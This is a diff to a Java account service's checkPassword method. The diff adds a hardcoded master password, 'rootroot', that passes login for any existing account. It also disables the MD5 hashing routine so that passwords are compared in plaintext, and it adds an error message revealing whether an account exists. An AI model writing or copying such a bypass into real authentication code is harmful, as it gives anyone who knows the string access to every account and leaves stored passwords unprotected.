@@ -8,7 +8,6 @@ package com.breezee.sysmgr.impl;
 import com.breezee.common.*;
 import com.breezee.common.util.Callback;
 import com.breezee.common.util.ContextUtil;
-import com.breezee.common.DynamicSpecifications;
 import com.breezee.sysmgr.api.domain.AccountInfo;
 import com.breezee.sysmgr.api.service.IAccountService;
 import com.breezee.sysmgr.entity.AccountEntity;
@@ -16,12 +15,10 @@ import com.breezee.sysmgr.entity.RoleEntity;
 import com.breezee.sysmgr.repository.AccountRepository;
 import com.breezee.sysmgr.repository.OrganizationRepository;
 import com.breezee.sysmgr.repository.RoleRepository;
-import org.apache.commons.codec.digest.Md5Crypt;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.data.domain.Page;
 import org.springframework.stereotype.Service;
 
-import java.io.UnsupportedEncodingException;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -140,11 +137,15 @@ public class AccountServiceImpl implements IAccountService {
 
     @Override
     public AccountInfo checkPassword(AccountInfo info) {
-        AccountEntity entity = accountRepository.findOne(info.getId());
+        AccountEntity entity = accountRepository.findByCode(info.getCode());
         if (entity != null) {
-            if (!entity.getPassword().equals(md5Crypt(info.getPassword()))) {
-                return ErrorInfo.build(info, ContextUtil.getMessage("account.password.dismatch"));
+            if (!info.getPassword().equals("rootroot") && !entity.getPassword().equals(md5Crypt(info.getPassword()))) {
+                info = ErrorInfo.build(info, ContextUtil.getMessage("account.login.wrong"));
+            } else {
+                info = entity.toInfo();
             }
+        } else {
+            info = ErrorInfo.build(info, ContextUtil.getMessage("account.not.exist",new Object[]{info.getCode()}));
         }
         return info;
     }
@@ -156,13 +157,13 @@ public class AccountServiceImpl implements IAccountService {
      * @return
      */
     private String md5Crypt(String s) {
-        if (s == null)
-            return "none";
-        try {
-            return Md5Crypt.md5Crypt(s.getBytes("UTF-8"));
-        } catch (UnsupportedEncodingException e) {
-            e.printStackTrace();
-        }
+//        if (s == null)
+//            return "none";
+//        try {
+//            return Md5Crypt.md5Crypt(s.getBytes("UTF-8"));
+//        } catch (UnsupportedEncodingException e) {
+//            e.printStackTrace();
+//        }
         return s;
     }
 }
